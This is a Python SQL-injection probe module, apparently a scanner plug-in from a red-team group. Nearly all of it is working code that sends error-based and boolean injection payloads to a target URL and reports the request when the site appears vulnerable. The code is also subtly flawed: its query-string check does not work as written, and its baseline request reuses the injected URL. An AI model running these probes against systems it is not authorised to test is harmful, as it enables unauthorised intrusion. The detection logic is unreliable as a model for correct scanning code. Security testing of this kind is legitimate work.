'''
Function:
    sql注入检测 高危
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import re
import random
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.BOOLEAN_TESTS = (" AND %d=%d", " OR NOT (%d=%d)", " AND %d=%d --+", " OR NOT (%d=%d) --+", "\" AND %d=%d --+", "\" OR NOT (%d=%d) --+", "' AND %d=%d --+", "' OR NOT (%d=%d) --+")
        self.DBMS_ERRORS = {
            "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
            "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
            "Microsoft SQL Server": (
            r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.",
            r"(?s)Exception.*\WRoadhouse\.Cms\."),
            "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
            "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*",
                       r"Warning.*\Wora_.*"),
            "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
            "SQLite": (
            r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
            "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
        }
        self.result_text = ""
        self.proxies = proxies

    def sqlcheck(self):
        try:
            if not self.url.find("?"):
                return False
            _url = self.url + "%29%28%22%27"
            content = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
            _content = content.text
            for (dbms, regex) in ((dbms, regex) for dbms in self.DBMS_ERRORS for regex in self.DBMS_ERRORS[dbms]):
                if (re.search(regex, _content)):
                    return content.request.headers, _url
            content = {}
            result_origin = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
            content["origin"] = result_origin.text
            for test_payload in self.BOOLEAN_TESTS:
                RANDINT = random.randint(1, 255)
                _url = self.url + test_payload % (RANDINT, RANDINT)
                result_true = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
                content["true"] = result_true.text
                _url = self.url + test_payload % (RANDINT, RANDINT + 1)
                result_false = requests.get(url=_url, headers=self.headers, verify=False, proxies=self.proxies)
                content["false"] = result_false.text
                if content["origin"] == content["true"] != content["false"]:
                    return result_origin.request.headers, _url
        except:
            return False

    def main(self):
        result = self.sqlcheck()
        if result != None and result:
            url = urlparse(result[1])
            self.result_text += """\n        [+]    \033[32m检测到目标站点存在SQL注入漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(url.path + "?" + url.query, url.netloc)
            for request_type, request_text in dict(result[0]).items():
                self.result_text += "\n                 {}: {}".format(request_type, request_text)
            return self.result_text
        else:
            return False
